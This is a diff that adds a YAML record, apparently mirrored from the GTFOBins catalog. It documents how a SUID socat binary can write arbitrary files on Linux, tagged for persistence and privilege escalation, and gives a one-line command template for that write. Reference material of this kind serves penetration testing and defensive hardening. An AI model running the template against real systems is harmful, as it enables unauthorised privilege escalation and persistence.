@@ -1,0 +1,25 @@
+id: gtfobins/socat/file-write/suid
+type: binary
+platform: linux
+name: socat
+phases:
+- persistence
+- privilege-escalation
+capabilities:
+- file-write
+privilege_required: suid
+sources:
+- project: GTFOBins
+  upstream_url: https://gtfobins.github.io
+  license: MIT (verify upstream LICENSE)
+  upstream_version: acd5246
+  last_synced: '2026-08-25'
+commands:
+- template: socat -u 'exec:echo DATA' open:/path/to/output-file,creat
+  comment: The `echo` command is actually used.
+references:
+- https://gtfobins.github.io/gtfobins/socat/
+tags:
+- linux
+- unix
+- gtfobins
